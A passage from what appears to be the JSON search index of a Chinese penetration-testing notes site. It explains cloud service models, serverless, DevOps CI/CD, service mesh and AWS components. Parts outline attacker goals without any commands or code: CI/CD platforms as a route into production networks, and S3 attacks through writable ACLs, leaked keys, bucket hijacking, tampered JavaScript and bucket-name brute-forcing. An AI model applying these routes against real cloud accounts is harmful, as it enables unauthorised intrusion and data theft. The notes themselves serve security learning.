\u4e13\u6709\u4e91\uff1a\u4e00\u79cd\u79c1\u6709\u5316\u90e8\u7f72\u7684\u516c\u6709\u4e91","title":"\u79c1\u6709\u3001\u516c\u6709\u3001\u6df7\u5408\u4e91"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/%E4%BA%91%E5%8E%9F%E7%94%9F%E7%9A%84%E6%A6%82%E5%BF%B5%E4%BB%AC/%E4%BA%91%E5%8E%9F%E7%94%9F%E7%9A%84%E6%A6%82%E5%BF%B5%E4%BB%AC/#iaaspaassaas","text":"\u4e09\u4e2a\u540d\u8bcd\u7684\u9996\u5b57\u6bcd\u5206\u522b\u5bf9\u5e94 \u57fa\u7840\u8bbe\u65bd(infrastructure)\u3001\u5e73\u53f0(platform)\u548c\u8f6f\u4ef6(software) IaaS\u7684\u610f\u601d\u662f \u57fa\u7840\u8bbe\u65bd\u5373\u670d\u52a1 \u4f60\u60f3\u642d\u4e00\u4e2a\u535a\u5ba2\uff0c\u5982\u679c\u8d70\u7684\u662fIaaS\u8def\u7ebf\uff0c\u4e91\u670d\u52a1\u5382\u5546\u4f1a\u7ed9\u4f60\u63d0\u4f9b\u4e00\u5806\u786c\u4ef6\u8bbe\u5907\uff0c\u4f60\u5f97\u81ea\u5df1\u88c5\u64cd\u4f5c\u7cfb\u7edf\u3001\u5f00\u53d1\u73af\u5883\u7b49\u5de5\u5177\uff0c\u4f60\u6709\u5f88\u9ad8\u7684\u81ea\u7531\u5ea6\u6765\u6307\u5b9a\u8fd9\u4e9b\u8bbe\u5907\u6765\u5e72\u4ec0\u4e48\u3002\u4e91\u670d\u52a1\u5668\u548cVPS\u5c31\u5c5e\u4e8eIaaS\u6982\u5ff5\u3002 \u6bd4\u8d77\u81ea\u5df1\u672c\u5730\u642d\u5efa\u4e00\u4e2a\u535a\u5ba2\u786e\u5b9e\u8282\u7ea6\u4e86\u5f88\u591a\u6210\u672c\uff0c\u4f46\u662f\u8fd9\u6837\u505a\u4ecd\u7136\u9700\u8981\u4f60\u6709\u5f88\u9ad8\u7684\u6280\u672f\u80fd\u529b\uff0c\u5e76\u4e14\u4ecd\u7136\u9700\u8981\u4ed8\u51fa\u6bd4\u8f83\u591a\u7684\u7ef4\u62a4\u7ba1\u7406\u6210\u672c\u3002 PaaS\u7684\u610f\u601d\u662f \u5e73\u53f0\u5373\u670d\u52a1 \u4f60\u60f3\u642d\u4e00\u4e2a\u535a\u5ba2\uff0c\u5982\u679c\u8d70\u7684\u662fPaaS\u8def\u7ebf\uff0c\u4e91\u670d\u52a1\u5382\u5546\u4f1a\u7ed9\u4f60\u63d0\u4f9b\u5df2\u7ecf\u628a\u64cd\u4f5c\u7cfb\u7edf\u3001\u5f00\u53d1\u73af\u5883\u3001\u6570\u636e\u5e93\u3001\u4e2d\u95f4\u4ef6\u7b49\u57fa\u7840\u5de5\u5177\u90fd\u5df2\u7ecf\u90e8\u7f72\u597d\u7684\u4e91\u670d\u52a1\u5668 \u6bd4\u8d77IaaS\u76f4\u63a5\u7ed9\u4f60\u4e00\u5806\u786c\u4ef6\uff0c\u63d0\u4f9b\u57fa\u7840\u8bbe\u65bd\u5df2\u7ecf\u642d\u5efa\u5b8c\u6bd5\u7684\u4e91\u670d\u52a1\u5668\u4f1a\u663e\u5f97\u66f4\u52a0\u53cb\u597d\uff0c\u535a\u5ba2\u4e0a\u7ebf\u7684\u901f\u5ea6\u4e5f\u4f1a\u66f4\u5feb\uff0c\u4f46\u662f\u6bd4\u8d77IaaS\u727a\u7272\u4e86\u4e00\u70b9\u7075\u6d3b\u6027 SaaS \u7684\u610f\u601d\u65f6 \u8f6f\u4ef6\u5373\u670d\u52a1 \u8bf4\u767d\u4e86\u5c31\u662f\u4e91\u8f6f\u4ef6\u3002 \u6bd4\u5982\u767e\u5ea6\u7f51\u76d8\u5c31\u5c5e\u4e8eSaas\u6982\u5ff5\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528\u767e\u5ea6\u7f51\u76d8\u6765\u5b58\u50a8\u6570\u636e\u3002\u4e0d\u8bba\u662fIaaS\u3001PaaS\uff0c\u60f3\u8981\u642d\u5efa\u4e00\u4e2a\u5b58\u50a8\u6570\u636e\u7684\u4e91\u5b58\u50a8\u5e73\u53f0\u90fd\u8fd8\u662f\u9700\u8981\u4e00\u70b9\u8ba1\u7b97\u673a\u57fa\u7840\u7684\uff0c\u800c\u4f7f\u7528\u767e\u5ea6\u7f51\u76d8\u53ea\u9700\u4e0b\u8f7d\u4e00\u4e2a\u767e\u5ea6\u7f51\u76d8\u6ce8\u518c\u4e2a\u8d26\u53f7\u5c31\u80fd\u5f00\u7bb1\u5373\u7528\uff0c\u65b9\u4fbf\u4e86\u592a\u591a\u3002 \u6bd4\u8d77IaaS\u3001PaaS\u786e\u5b9e\u65b9\u4fbf\u4e86\u5f88\u591a\uff0c\u4f46\u662f\u7075\u6d3b\u6027\u4e5f\u53d7\u5230\u4e86\u5f88\u5927\u7684\u963b\u788d\u3002 \u9664\u4e86\u4e0a\u9762\u7684\u4e09\u4e2a\u6982\u5ff5\u5916\uff0c\u8fd8\u6709\u4e00\u4e9b\u7c7b\u4f3c\u7684\u6982\u5ff5\u3002 BaaS \u540e\u7aef\u5373\u670d\u52a1\u3001FaaS\u51fd\u6570\u5373\u670d\u52a1\u3002\u8fd9\u4e24\u4e2a\u6982\u5ff5\u90fd\u5c5e\u4e8eServerless\uff08\u65e0\u670d\u52a1\uff09\u7684\u8303\u7574\uff0c\u4e0e\u4e0a\u9762\u4e09\u4e2a\u6709\u70b9\u533a\u522b\u3002\u65e0\u670d\u52a1\u662f\u4e00\u79cd\u4e91\u539f\u751f\u6a21\u578b\uff1a\u5f00\u53d1\u8005\u4e0d\u7528\u53bb\u7ba1\u670d\u52a1\u5668\u53ea\u8d1f\u8d23\u5f00\u53d1\u5c31\u884c BaaS\u540e\u7aef\u5373\u670d\u52a1 \u5bf9\u4e8e\u642d\u5efa\u7f51\u7ad9\uff0c\u5982\u679c\u6211\u4eec\u4f7f\u7528SaaS\u5efa\u7ad9\uff0c\u90a3\u4e48\u5f53\u6211\u4eec\u60f3\u8981\u66f4\u6539\u524d\u7aef\u9875\u9762\uff08\u6bd4\u5982\u52a0\u4e00\u4e2alogo\uff09\u7684\u65f6\u5019\u53ef\u80fd\u4f1a\u9047\u5230\u9ebb\u70e6\uff1a\u90a3\u4e48\u591a\u7528\u6237\u5728\u7528\uff0c\u4e0d\u80fd\u4e3a\u4e86\u4f60\u4e00\u4e2a\u4eba\u800c\u6539\u3002 BaaS\u5c31\u662f\u4e3a\u4e86\u89e3\u51b3\u6b64\u7c7b\u95ee\u9898\u800c\u751f\u7684\uff0c\u6211\u4eec\u53ea\u9700\u8981\u8d1f\u8d23\u524d\u7aef\u90e8\u5206\u7684\u5f00\u53d1\uff0c\u540e\u7aef\u90e8\u5206\u5c31\u4ea4\u7ed9\u4e91\u670d\u52a1\u5382\u5546\u5427\u3002 FaaS \u51fd\u6570\u5373\u670d\u52a1 \u4e91\u51fd\u6570\u5c31\u5c5e\u4e8e\u6b64\u7c7b\u3002\u6211\u4eec\u76f4\u63a5\u53ef\u4ee5\u5728\u4e91\u4e0a\u90e8\u7f72\u51fd\u6570\uff0c\u8fd9\u4e9b\u51fd\u6570\u6bcf\u88ab\u8c03\u7528\u4e00\u6b21\u4ea7\u751f\u4e00\u6b21\u6536\u8d39\u3002 \u6536\u8d39\u66f4\u52a0\u7075\u6d3b\u4e86\u3002 FaaS \u7684\u76f8\u5173\u4ea7\u54c1\u4e3b\u8981\u6709 AWS \u7684 Lambda\u3001Azure \u7684 Functions Serverless Compute\u3001GCP \u7684 Firebase Cloud Functions\u3001\u963f\u91cc\u4e91\u7684 Function Compute \u7b49","title":"IaaS\u3001PaaS\u548cSaaS"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/%E4%BA%91%E5%8E%9F%E7%94%9F%E7%9A%84%E6%A6%82%E5%BF%B5%E4%BB%AC/%E4%BA%91%E5%8E%9F%E7%94%9F%E7%9A%84%E6%A6%82%E5%BF%B5%E4%BB%AC/#serverless","text":"\u65e0\u670d\u52a1\u5668\u8ba1\u7b97\uff0c\u6838\u5fc3\u601d\u60f3\u662f\u8ba9\u5f00\u53d1\u8005\u6ce8\u91cd\u4e8e\u4ee3\u7801\u5f00\u53d1\u672c\u8eab\uff0c\u800c\u4e0d\u662f\u73af\u5883\u914d\u7f6e\u7b49\u5de5\u4f5c\u3002 Faas\u548cBaas\u5c31\u662fServerless\u601d\u60f3\u7684\u4f53\u73b0\u4e4b\u4e00\u3002 \u6240\u9762\u4e34\u7684\u5b89\u5168\u95ee\u9898\uff1a \u6587\u4ef6\u9a7b\u7559\u5bfc\u81f4RCE \u73af\u5883\u542f\u52a8\u65f6\u4e0b\u8f7d\u7b2c\u4e09\u65b9\u5e93\u9020\u6210RCE","title":"serverless"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/%E4%BA%91%E5%8E%9F%E7%94%9F%E7%9A%84%E6%A6%82%E5%BF%B5%E4%BB%AC/%E4%BA%91%E5%8E%9F%E7%94%9F%E7%9A%84%E6%A6%82%E5%BF%B5%E4%BB%AC/#devops","text":"\u8fd9\u662f\u4e00\u4e2a\u6211\u968f\u4fbf\u627e\u7684DevOps demo\u7f51\u7ad9\uff0c\u53ef\u4ee5\u8fdb\u53bb\u611f\u53d7\u611f\u53d7 http://dockerone.com/article/8948 \u7b80\u800c\u8a00\u4e4b\uff0c\u5c31\u662f\u52a0\u5f3a\u5f00\u53d1\u4e0e\u8fd0\u7ef4\u4eba\u5458\u4e4b\u95f4\u6c9f\u901a\u6548\u7387\u7684\u4e00\u4e2a\u5e73\u53f0\u3002\u4f7f\u5f00\u53d1\u8fd0\u7ef4\u4e00\u4f53\u5316\u3002DEV\u5c31\u662f\u5f00\u53d1\uff0cOPS\u5c31\u662f\u8fd0\u7ef4\u3002 \u6700\u5f00\u59cb\u7a0b\u5e8f\u5f00\u53d1\u662f\u5355\u4f53\u67b6\u6784+\u7011\u5e03\u6a21\u5f0f\uff0c\u4f46\u968f\u7740\u4e1a\u52a1\u91cf\u7684\u589e\u591a\uff0c\u9700\u8981\u7684\u5de5\u4f5c\u4eba\u5458\u4e5f\u8d8a\u591a\uff0c\u9700\u8981\u591a\u4eba\u534f\u4f5c\u5f00\u53d1\uff0c\u654f\u6377\u5f00\u53d1\u5c31\u51fa\u73b0\u4e86\u3002 \u4f46\u662f\u654f\u6377\u5f00\u53d1\u6ca1\u6709\u89e3\u51b3\u5f00\u53d1\u548c\u8fd0\u7ef4\u4eba\u5458\u4e4b\u95f4\u7684\u77db\u76fe\u201c\u8fd0\u7ef4\u7684\u5bbf\u547d\u5c31\u662f\u7ef4\u7a33\uff0c\u4ed6\u4eec\u662f\u5f88\u8ba8\u538c\u53d8\u52a8\u7684\uff1b\u5f00\u53d1\u7684\u5929\u804c\u786e\u662f\u4e0d\u65ad\u5730\u63a8\u4ee3\u7801\u4e0a\u7ebf\uff0c\u8fdb\u884c\u4ee3\u7801\u53d8\u52a8\uff0c\u66f4\u66ff\u8fed\u4ee3\uff0c\u8fd9\u4e24\u4e2a\u5de5\u79cd\u5929\u751f\u5c31\u662f\u5bf9\u7acb\u7684\u201d\uff0c\u6240\u4ee5DevOps\u51fa\u73b0\u4e86\uff0c\u5b83\u7684\u51fa\u73b0\u5c31\u662f\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e00\u4e2a\u95ee\u9898\uff0c\u589e\u5f3a\u5f00\u53d1\u4e0e\u8fd0\u7ef4\u4e4b\u95f4\u7684\u6c9f\u901a\u6548\u7387\u3002 DevOps\u5e38\u89c1\u7684\u4e00\u4e9b\u5e94\u7528 \u9879\u76ee\u7ba1\u7406\uff08PM\uff09\uff1ajira\u3002\u8fd0\u8425\u53ef\u4ee5\u4e0a\u53bb\u63d0\u95ee\u9898\uff0c\u53ef\u4ee5\u770b\u5230\u5404\u4e2a\u95ee\u9898\u7684\u5b8c\u6574\u7684\u5de5\u4f5c\u6d41\uff0c\u5f85\u89e3\u51b3\u672a\u89e3\u51b3\u7b49 \u4ee3\u7801\u7ba1\u7406\uff1agitlab\u3002jenkins\u6216\u8005K8S\u90fd\u53ef\u4ee5\u96c6\u6210gitlab\uff0c\u8fdb\u884c\u4ee3\u7801\u7ba1\u7406\uff0c\u4e0a\u7ebf\uff0c\u56de\u6eda\u7b49\uff1b \u6301\u7eed\u96c6\u6210CI\uff08Continuous Integration\uff09\uff1agitlab ci\u3002\u5f00\u53d1\u4eba\u5458\u63d0\u4ea4\u4e86\u65b0\u4ee3\u7801\u4e4b\u540e\uff0c\u7acb\u523b\u8fdb\u884c\u6784\u5efa\u3001\uff08\u5355\u5143\uff09\u6d4b\u8bd5\u3002\u6839\u636e\u6d4b\u8bd5\u7ed3\u679c\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u65b0\u4ee3\u7801\u548c\u539f\u6709\u4ee3\u7801\u80fd\u5426\u6b63\u786e\u5730\u96c6\u6210\u5728\u4e00\u8d77 \u6301\u7eed\u4ea4\u4ed8CD\uff08Continuous Delivery\uff09\uff1agitlab cd\u3002\u5b8c\u6210\u5355\u5143\u6d4b\u8bd5\u540e\uff0c\u53ef\u4ee5\u628a\u4ee3\u7801\u90e8\u7f72\u5230\u8fde\u63a5\u6570\u636e\u5e93\u7684 Staging \u73af\u5883\u4e2d\u66f4\u591a\u7684\u6d4b\u8bd5\u3002\u5982\u679c\u4ee3\u7801\u6ca1\u6709\u95ee\u9898\uff0c\u53ef\u4ee5\u7ee7\u7eed\u624b\u52a8\u90e8\u7f72\u5230\u751f\u4ea7\u73af\u5883\u4e2d\u3002 \u955c\u50cf\u4ed3\u5e93\uff1aVMware Harbor\uff0c\u79c1\u670dnexus\u3002 \u5bb9\u5668\uff1aDocker\u3002 \u7f16\u6392\uff1aK8S\u3002 \u670d\u52a1\u6cbb\u7406\uff1aConsul\u3002\u811a \u672c\u8bed\u8a00\uff1aPython\u3002 \u65e5\u5fd7\u7ba1\u7406\uff1aCat+Sentry\uff0c\u8fd8\u6709\u79cd\u5e38\u7528\u7684\u662fELK\u3002 \u7cfb\u7edf\u76d1\u63a7\uff1aPrometheus\u3002 \u8d1f\u8f7d\u5747\u8861\uff1aNginx\u3002 \u7f51\u5173\uff1aKong\uff0czuul\u3002 \u94fe\u8def\u8ffd\u8e2a\uff1aZipkin\u3002 \u4ea7\u54c1\u548cUI\u56fe\uff1a\u84dd\u6e56\u3002 \u516c\u53f8\u5185\u90e8\u6587\u6863\uff1aConfluence\u3002 \u62a5\u8b66\uff1a\u63a8\u9001\u5230\u5de5\u4f5c\u7fa4\u3002 \u2014\u2014\u5f15\u7528\u81ea\u77e5\u4e4e\uff1a\u5c0f\u9f99\u98de \u53ef\u4ee5\u4ece\u4e0a\u9762\u770b\u5230CI\uff08\u6301\u7eed\u96c6\u6210\uff09/CD\uff08\u6301\u7eed\u4ea4\u4ed8 \uff09\u8fd9\u4e2a\u6982\u5ff5 CI\u6301\u7eed\u96c6\u6210\u6784\u5efa\u8f6f\u4ef6\u548c\u5b8c\u6210\u521d\u59cb\u6d4b\u8bd5\u7684\u8fc7\u7a0b\u3002\u5927\u6982\u4f1a\u7ecf\u5386\u4e0b\u9762\u7684\u9636\u6bb5\uff1a \u4ee3\u7801\u63d0\u4ea4\uff1a\u901a\u8fc7Github\u3001gitlab\u7b49\u6280\u672f\u5c06\u4ee3\u7801\u63d0\u4ea4\u5230\u4ee3\u7801\u5b58\u50a8\u5e93 \u9759\u6001\u4ee3\u7801\u68c0\u67e5\uff1aSAST\u767d\u76d2\u6d4b\u8bd5\uff0c\u4ee5\u53d1\u73b0\u8f6f\u4ef6\u7f3a\u9677\u6216\u8005\u5b89\u5168\u6f0f\u6d1e \u6784\u5efa\uff1a\u5c06\u6e90\u4ee3\u7801\u6784\u5efa\u6210\u4e8c\u8fdb\u5236\u6587\u4ef6\u6216\u8005\u6784\u5efa\u4ea7\u7269\uff0c\u8fdb\u884c\u6784\u5efa\u9a8c\u8bc1\u6d4b\u8bd5\u67e5\u770b\u6a21\u5757\u662f\u5426\u517c\u5bb9\uff0c\u5e76\u63d0\u4ea4\u5230\u4e2d\u592e\u5b58\u50a8\u5e93\u8fdb\u884c\u7ba1\u7406\u3002\u4e00\u822c\u4f1a\u7528\u5230jenkins\uff0cmaven\u7b49\u5de5\u5177 \u6d4b\u8bd5\uff1a\u5355\u5143\u6d4b\u8bd5\uff0c\u6d4bbug CD\u662f\u5c06\u4ee3\u7801\u4e0e\u57fa\u7840\u8bbe\u65bd\u76f8\u7ed3\u5408\u7684\u8fc7\u7a0b\uff0c\u786e\u4fdd\u5b8c\u6210\u6240\u6709\u6d4b\u8bd5\u5e76\u9075\u5faa\u7b56\u7565\uff0c\u7136\u540e\u5c06\u4ee3\u7801\u90e8\u7f72\u5230\u9884\u671f\u73af\u5883\u4e2d bake\uff1a\u521b\u5efa\u955c\u50cf\u5b9e\u4f8b \u90e8\u7f72\uff1a\u5c06\u955c\u50cf\u5b9e\u4f8b\u8fdb\u884c\u90e8\u7f72 \u9a8c\u8bc1\uff1a\u89e3\u51b3\u6545\u969c \u76d1\u63a7\uff1a\u88c5\u76d1\u63a7\u8f6f\u4ef6\uff08Zabbix\u3001Nagios\u7b49\uff09\u5bf9\u7cfb\u7edf\u8fdb\u884c\u5206\u6790\u76d1\u63a7 \u53cd\u9988\u548c\u534f\u4f5c\uff1a\u53cd\u9988\u7cfb\u7edf\uff0c\u5411\u5f00\u53d1\u4eba\u5458\u548c\u9879\u76ee\u7ecf\u7406\u63d0\u4f9b\u53cd\u9988\uff0c\u4ee5\u51cf\u5c11\u9519\u8bef\u548c\u6027\u80fd\u95ee\u9898\uff0c\u5e38\u7528\u8f6f\u4ef6\uff08JIRA\uff0c\u7535\u5b50\u90ae\u4ef6\uff09 CI/CD\u662fDevOps\u5e73\u53f0\u4e0d\u53ef\u6216\u7f3a\u7684\u90e8\u5206\uff0c\u800cCI/CD\u53c8\u662f\u4e0e\u529e\u516c\u7f51\u3001\u751f\u4ea7\u7f51\u3001\u5f00\u53d1\u7f51\u90fd\u6709\u4ea4\u4e92\u7684\u4e1c\u897f\uff0c\u6240\u4ee5\u901a\u5e38\u60c5\u51b5\u4e0b\u63a7\u5236\u4e86DevOps\u5e73\u53f0\u4e5f\u5c31\u610f\u5473\u7740\u6709\u80fd\u7a81\u7834\u8fdb\u751f\u4ea7\u7f51\u7684\u65b9\u6cd5\u3002","title":"DevOps"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/%E4%BA%91%E5%8E%9F%E7%94%9F%E7%9A%84%E6%A6%82%E5%BF%B5%E4%BB%AC/%E4%BA%91%E5%8E%9F%E7%94%9F%E7%9A%84%E6%A6%82%E5%BF%B5%E4%BB%AC/#_4","text":"\u63d0\u670d\u52a1\u7f51\u683c\u5c31\u4e0d\u5f97\u4e0d\u8bf4\u5230\u5fae\u670d\u52a1\uff1a https://www.zhihu.com/question/65502802 \u7b80\u800c\u8a00\u4e4b\uff0c\u5fae\u670d\u52a1\u628a\u4e1a\u52a1\u7cfb\u7edf\u62c6\u5206\u6210\u4e00\u4e2a\u4e00\u4e2a\u7684\u6a21\u5757\uff08\u6216\u8005\u53eb\u5fae\u670d\u52a1\uff09\uff0c\u6bcf\u4e2a\u6a21\u5757\u5404\u53f8\u5176\u804c\uff0c\u80fd\u6709\u6548\u89e3\u51b3\u4e1a\u52a1\u7cfb\u7edf\u53d1\u5c55\u5230\u540e\u671f\u6742\u4e71\u65e0\u7ae0\u7684\u72b6\u6001\u3002 \u4f46\u662f\u5fae\u670d\u52a1\u4e0e\u5fae\u670d\u52a1\u4e4b\u95f4\u4e5f\u662f\u6709\u901a\u4fe1\u7684\uff0c\u5728\u6a21\u5757\u5c11\u7684\u65f6\u5019\u53ea\u9700\u8981\u7528\u4ee3\u7801\u903b\u8f91\u4e3a\u6bcf\u4e2a\u670d\u52a1\u7f16\u5199\u4e00\u5957\u4e0e\u5176\u4ed6\u5fae\u670d\u52a1\u7684\u901a\u4fe1\u903b\u8f91\u5373\u53ef \u4f46\u662f\u968f\u7740\u4e1a\u52a1\u7cfb\u7edf\u6269\u5927\uff0c\u5fae\u670d\u52a1\u589e\u591a\uff0c\u4e3a\u6bcf\u4e2a\u5fae\u670d\u52a1\u7f16\u5199\u901a\u4fe1\u903b\u8f91\u9700\u8981\u4ed8\u51fa\u5927\u91cf\u6210\u672c\uff0c\u6240\u4ee5\u670d\u52a1\u7f51\u683c\u7684\u6982\u5ff5\u51fa\u73b0\u4e86\uff0c\u670d\u52a1\u7f51\u683c\u53ef\u4ee5\u5c06\u5927\u91cf\u79bb\u6563\u7684\u5fae\u670d\u52a1\u96c6\u5408\u4e3a\u4e00\u4e2a\u6574\u4f53\u3002 \u7b80\u800c\u8a00\u4e4b\uff0c\u670d\u52a1\u7f51\u683c\u4e3a\u6bcf\u4e2a\u5fae\u670d\u52a1\u6784\u5efa\u4e86\u4e00\u4e2a\u4ee3\u7406\uff08sidecar\uff09\uff0c\u8be5\u4ee3\u7406\u5185\u7f6e\u4e8e\u5fae\u670d\u52a1\u4e2d\u4e13\u95e8\u7684\u57fa\u7840\u67b6\u6784\u5c42 \uff0c\u670d\u52a1\u4e0e\u670d\u52a1\u4e4b\u95f4\u7684\u901a\u4fe1\u901a\u8fc7\u8fd9\u4e2a\u4ee3\u7406\u5b9e\u73b0\uff0c Istio\u5219\u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u670d\u52a1\u7f51\u683c\u5e73\u53f0\u3002","title":"\u670d\u52a1\u7f51\u683c"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/%E6%A9%84%E6%A6%84AWS%EF%BC%81/%E6%A9%84%E6%A6%84AWS%EF%BC%81/","text":"\u6a44\u6984AWS\uff01 \u76ee\u5f55 \u4e91\u670d\u52a1\u76f8\u5173\u7ec4\u4ef6 S3 \u5bf9\u8c61\u5b58\u50a8 EC2\u5f39\u6027\u8ba1\u7b97 RDS\u4e91\u6570\u636e\u5e93 IAM\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406 \u9488\u5bf9\u5404\u7ec4\u4ef6\u7684\u653b\u51fb\u65b9\u5f0f S3\u5bf9\u8c61\u5b58\u50a8 EC2 \u5f39\u6027\u8ba1\u7b97\u670d\u52a1 \u4e91\u670d\u52a1\u76f8\u5173\u7ec4\u4ef6 ref: https://wiki.teamssix.com/CloudService/S3/ \u7531\u4e8e\u5404\u4e2a\u4e91\u5382\u5546\u5bf9\u4e91\u670d\u52a1\u7684\u53eb\u6cd5\u4e0d\u7edf\u4e00\uff0c\u8fd9\u91cc\u5c31\u7edf\u4e00\u4ee5AWS\u7684\u5206\u7c7b\u6765\u53d9\u8ff0\u3002 AWS\u662f\u4ec0\u4e48\uff1f\u7b80\u5355\u7406\u89e3\u4e3a\u4e9a\u9a6c\u900a\u7684\u4e91\u670d\u52a1\u5e73\u53f0\u5c31\u884c\u4e86\u3002 S3 \u5bf9\u8c61\u5b58\u50a8 \u8d77\u5230\u4e91\u5b58\u50a8\u7684\u4f5c\u7528\uff0c\u963f\u91cc\u4e91\u7ba1\u8fd9\u4e2a\u53ebOSS\uff0c\u90fd\u4e00\u6837\u3002\u4e5f\u6709\u4e0d\u5c11\u5382\u5546\u76f4\u63a5\u53eb\u5b83\u4e91\u5b58\u50a8\u3002 \u800cAWS\u63d0\u4f9b\u7684\u5bf9\u8c61\u5b58\u50a8\u670d\u52a1\u662f\u57fa\u4e8eS3\u534f\u8bae\u7684\uff0cS3\u534f\u8bae\u5df2\u6210\u4e3a\u4e1a\u754c\u6807\u51c6\uff0c\u56fd\u5185\u4e3b\u6d41\u5bf9\u8c61\u5b58\u50a8\u5382\u5546\u90fd\u652f\u6301S3\u534f\u8bae\u3002 \u4e0b\u56fe\u662f\u5bf9S3\u6807\u51c6\u7684\u4e00\u4e2a\u63cf\u8ff0\u3002\u5927\u81f4\u6709\u4e09\u4e2a\u90e8\u5206\uff1akey\u3001Data\u3001Metadata\uff0c\u8fd9\u4e09\u4e2a\u90e8\u5206\u90fd\u5b58\u50a8\u5728Bucket\u91cc Key\uff1a\u5b58\u50a8\u6876\uff08Bucket\uff09\u4e2d\u67d0\u4e00\u4e2a\u5b58\u50a8\u5bf9\u8c61\u7684\u7684\u552f\u4e00\u6807\u8bc6\u7b26\u3002\u201c\u4f8b\u5982\u4e00\u4e2a URL \u4e3a\uff1a https://teamssix.s3.ap-northeast-2.amazonaws.com/flag\uff0c\u8fd9\u91cc\u7684 teamssix \u662f\u5b58\u50a8\u6876 Bucket \u7684\u540d\u79f0\uff0c/flag \u5c31\u662f Key\u201d Data\uff1a\u6570\u636e\u672c\u4f53 Metadata\uff1a\u5143\u6570\u636e\uff0c\u8bb0\u5f55\u6570\u636e\u7684\u6807\u7b7e\u3001\u63cf\u8ff0\u7b49\u4fe1\u606f\uff0c\u7528\u4e8e\u52a0\u901f\u5bf9\u8c61\u7684\u6392\u5e8f\u3001\u5206\u7c7b\u3001\u67e5\u627e\u3002 EC2\u5f39\u6027\u8ba1\u7b97 \u4e91\u4e0a\u7684\u865a\u62df\u673a\u3002\u7b80\u800c\u8a00\u4e4b\u53ef\u4ee5\u7406\u89e3\u4e3aVPS\u3002 \u4e00\u4e9b\u540d\u8bcd\u7684\u89e3\u91ca\uff1a AMI\uff1a Amazon \u7cfb\u7edf\u6620\u50cf \uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\u521b\u5efaVPS\u65f6\u6240\u9009\u7684\u521d\u59cb\u955c\u50cf\u3002 RDS\u4e91\u6570\u636e\u5e93 \u987e\u540d\u601d\u4e49\uff0c\u4e91\u4e0a\u7684\u6570\u636e\u5e93\u3002 \u90a3\u4e48\u5bf9\u8c61\u5b58\u50a8\u548c\u4e91\u6570\u636e\u5e93\u90fd\u662f\u5b58\u50a8\u6570\u636e\u7684\uff0c\u6709\u4ec0\u4e48\u533a\u522b\u5462\uff1f \u5bf9\u8c61\u5b58\u50a8\u66f4\u591a\u9762\u4e34\u7684\u573a\u666f\u662f\u975e\u7ed3\u6784\u5316\u7684\u6570\u636e\uff0c\u6bd4\u5982\u6587\u4ef6\u3001\u56fe\u7247\u3001\u89c6\u9891\u3002\u6bd4\u5982\u5f88\u591a\u4eba\u5c31\u559c\u6b22\u7528\u963f\u91cc\u4e91oss\u642d\u5efa\u535a\u5ba2\u56fe\u5e8a\u3002 \u800c\u4e91\u6570\u636e\u5e93\u76f4\u63a5\u63d0\u4f9b\u5982mysql\u3001oracle\u7b49\u6570\u636e\u5e93\u7684\u4e91\u4e0a\u7ba1\u7406\u80fd\u529b\u3002 IAM\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406 \u653e\u5728\u4e91\u4e0a\u7684\u8eab\u4efd\u7ba1\u7406\u670d\u52a1 \u4e3e\u4e2a\u5f62\u8c61\u7684\u4f8b\u5b50: \u5f88\u591a\u8bba\u575b\u90fd\u63d0\u4f9b\u4e86\u4e00\u4e2a\u7b2c\u4e09\u65b9\u767b\u5f55\u7684\u63a5\u53e3\uff0c\u6bd4\u5982qq\u767b\u5f55\u3001\u5fae\u4fe1\u767b\u9646\uff0c\u70b9\u51fb\u5e94\u7528\u56fe\u6807\u5373\u53ef\u81ea\u52a8\u767b\u5f55\u8fdb\u5165\u5e94\u7528\uff0c\u4f7f\u7528\u5df2\u88ab\u81ea\u52a8\u6388\u6743\u7684\u529f\u80fd\u3002\u7136\u540e\u7ba1\u7406\u4eba\u5458\u53ef\u4ee5\u5728\u7ba1\u7406\u540e\u53f0\u7edf\u8ba1\u5458\u5de5\u7684\u767b\u5f55\u60c5\u51b5\u3001\u4f7f\u7528\u60c5\u51b5\u3002 \u9488\u5bf9\u5404\u7ec4\u4ef6\u7684\u653b\u51fb\u65b9\u5f0f S3\u5bf9\u8c61\u5b58\u50a8 https://zone.huoxian.cn/d/907-aws-s3/5 \u5927\u81f4\u5206\u4e3a\uff1a \u00b7\u914d\u7f6e\u5931\u8bef\u5bfc\u81f4ACL\u6216\u8005\u5b58\u50a8\u5bf9\u8c61\u5185\u5bb9\u53ef\u5199\u5165\u3001\u6216\u8005\u4fe1\u606f\u6cc4\u9732 \u00b7key\u6cc4\u9732\u76f4\u63a5\u63a5\u7ba1 \u00b7bucket\u53ef\u63a7\u540e\u9020\u6210\u9493\u9c7c\u3001\u4e1a\u52a1\u762b\u75ea \u00b7\u52ab\u6301\u7f51\u9875\u5b58\u50a8\u5728bucket\u4e2d\u7684js\u4ee3\u7801 \u00b7bucket name \u7206\u7834 EC2 \u5f39\u6027\u8ba1\u7b97\u670d\u52a1 https://zone.huoxian.cn/d/1022-aws-ec2 